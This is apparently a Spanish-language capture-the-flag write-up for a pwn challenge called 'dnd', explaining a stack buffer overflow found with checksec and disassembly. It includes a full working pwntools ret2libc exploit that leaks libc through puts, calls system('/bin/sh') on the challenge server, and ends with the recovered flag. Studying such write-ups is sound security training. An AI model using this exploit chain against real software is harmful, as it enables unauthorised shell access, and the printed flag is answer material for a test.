# dnd

`patchelf --set-interpreter ./ld-linux-x86-64.so.2 --replace-needed libc.so.6 ./libc.so.6 dnd && chmod u+x dnd libc.so.6 ld-linux-x86-64.so.2`

```
checksec --file=dnd
[*] '/home/kalcast/Descargas/Pwn/dnd/dnd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

El binario no tiene PIE ni canary (direcciones fijas y posible buffer overflow)

Si obtenemos puntos negativos "ganamos" el juego y entonces podemos introducir nuestro nombre. Se usa la funcion `fgets` para leer 0x100 bytes en un buffer de 32 asi que claramente hay un buffer overflow
```
var int64_t var_40h @ rbp-0x40
var char * s @ rbp-0x60             <--- se almacena aqui (0x60-0x40=0x20=32 bytes)
...
|           0x004028a5      488b15d458..   mov rdx, qword [obj.stdin]  ; loc.__bss_start
|                                                                      ; [0x408180:8]=0 ; FILE *stream
|           0x004028ac      488d45a0       lea rax, [s]
|           0x004028b0      be00010000     mov esi, 0x100              ; 256 ; int size
|           0x004028b5      4889c7         mov rdi, rax                ; char *s
|           0x004028b8      e813fcffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
```

El offset es de 0x60 + 8(RBP almacenado) = 104 bytes

Primero hacemos un leak de una direccion de libc. Las direcciones de libc se almacenan en la GOT, usamos por ejemplo `got.puts` y se lo pasamos de argumento a `plt.puts`, entonces puts imprimira su propia direccion y asi podremos calcular la direccion base de libc.

Para esto necesitamos un gadget. Un `pop rdi;ret` seria lo ideal pero lo mejor que pude obtener fueron estos:
```
ROPgadget --binar dnd | grep rdi
0x000000000040263d : in eax, 0x6a ; pop rdi ; nop ; pop rbp ; ret
0x0000000000403504 : mov ebp, esp ; mov qword ptr [rbp - 8], rdi ; nop ; pop rbp ; ret
0x000000000040263c : mov ebp, esp ; push 0x42 ; pop rdi ; nop ; pop rbp ; ret
0x00000000004041d1 : mov qword ptr [rbp - 8], rdi ; mov qword ptr [rbp - 0x10], rsi ; jmp 0x4041f4
0x0000000000403c44 : mov qword ptr [rbp - 8], rdi ; mov rax, qword ptr [rbp - 8] ; pop rbp ; ret
0x0000000000403506 : mov qword ptr [rbp - 8], rdi ; nop ; pop rbp ; ret
0x0000000000403503 : mov rbp, rsp ; mov qword ptr [rbp - 8], rdi ; nop ; pop rbp ; ret
0x000000000040263b : mov rbp, rsp ; push 0x42 ; pop rdi ; nop ; pop rbp ; ret
0x0000000000404467 : movsd dword ptr [rdi], dword ptr [rsi] ; loopne 0x404469 ; dec dword ptr [rax - 0x75] ; pop rbp ; clc ; leave ; ret
0x00000000004025a6 : or dword ptr [rdi + 0x408158], edi ; jmp rax
0x000000000040200c : pop rdi ; add byte ptr [rax], al ; test rax, rax ; je 0x402016 ; call rax
0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
0x000000000040263e : push 0x42 ; pop rdi ; nop ; pop rbp ; ret
0x000000000040263a : push rbp ; mov rbp, rsp ; push 0x42 ; pop rdi ; nop ; pop rbp ; ret
0x0000000000402e9e : sar byte ptr [rdi + 7], 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x402ead
0x00000000004044ad : stosb byte ptr [rdi], al ; add byte ptr [rax], al ; add cl, cl ; ret
```

Con la direccion base de libc conocida retornamos a main, "jugamos" y obtenemos la entrada vulnerable de nuevo, usamos nuestro gadget otra vez pero esta vez el parametro es `/bin/sh` y llamaremos a `system` para invocar una shell interactiva.

Exploit
```python
from pwn import *
#io = process("./dnd")
io = remote("dnd.chals.damctf.xyz",30813)
elf = context.binary = ELF("./dnd")
libc = context.binary = ELF("./libc.so.6")

# Negative points to get input
def play_game():
    io.recvuntil(b"Do you want to [a]ttack or [r]un? ")
    io.sendline(b"a")
    io.recvuntil(b"Points: ")
    points = int(io.recvuntil(b"|").decode()[:-2])
    if points < 0:
        for _ in range(4):
            io.recv()
            io.sendline(b"r")
    else:
        print("Fail!")
        exit(1)


# === ret2libc ===
# 1. leak libc.puts
play_game()
# 0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
pop_rdi_addr = 0x402640
payload = flat (
         cyclic(104),
         p64(pop_rdi_addr),
         elf.got.puts,
         b"A"*8,
         elf.plt.puts,
         p64(0x0040286d) # win__ address
#         elf.sym.main,
        )
io.sendlineafter(b"fierce warrior?",payload)
io.recvline()

# 2. Get libc base address
leak = io.recvline().strip()
puts_libc = u64(leak.ljust(8, b"\x00"))
log.success(f"puts@libc: {hex(puts_libc)}")
libc.address = puts_libc - libc.sym.puts

# 3. Call system("/bin/sh")
sh = next(libc.search(b"/bin/sh\x00"))
ret_addr = pop_rdi_addr + 3
payload = flat (
         cyclic(104),
         p64(ret_addr),       # stack alignment
         p64(pop_rdi_addr),
         sh,
         b"A"*8,
         libc.sym['system'],
#         p64(0),              # stack alignment
        )
io.sendlineafter(b"fierce warrior?", payload)
io.interactive()
```

`dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}`
